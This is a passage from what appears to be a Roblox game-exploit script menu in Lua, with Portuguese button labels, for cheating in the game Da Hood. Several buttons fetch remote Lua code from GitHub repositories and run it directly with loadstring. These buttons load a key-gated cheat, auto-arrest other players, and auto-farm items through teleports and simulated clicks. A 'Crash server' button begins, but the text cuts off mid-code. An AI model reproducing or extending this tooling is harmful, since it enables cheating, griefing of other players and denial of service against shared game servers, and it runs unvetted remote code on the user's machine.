Scripts.Button({
    Text = "Zordion [ precisa de key, mas voce ja sabe qual é ]",
    Callback = function()
        repeat
	wait()
	until game:IsLoaded()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/zordion/main/script.lua"))()
    end
})
Scripts.Button({
    Text = "Auto arreset players",
    Callback = function()
        loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Arrest"), true))()
    end
})
Scripts.Button({
    Text = "Auto farm lettuce [ reset to stop ]",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-86, 23, -633)
wait(0.3)
while true do
    fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"].ClickDetector, 1)
    wait(0.7)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ilxsxmuuu/OutrasScripts/main/auto%20equip%20lettuce', true))()
    wait()
    game:GetService("Workspace").Players[game.Players.LocalPlayer.Name]["[Lettuce]"]:Activate()
    wait(0.8)
end

    end
})
PaginaVendas.Button({
    Text = "Crash server",
    Callback = function()
        local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
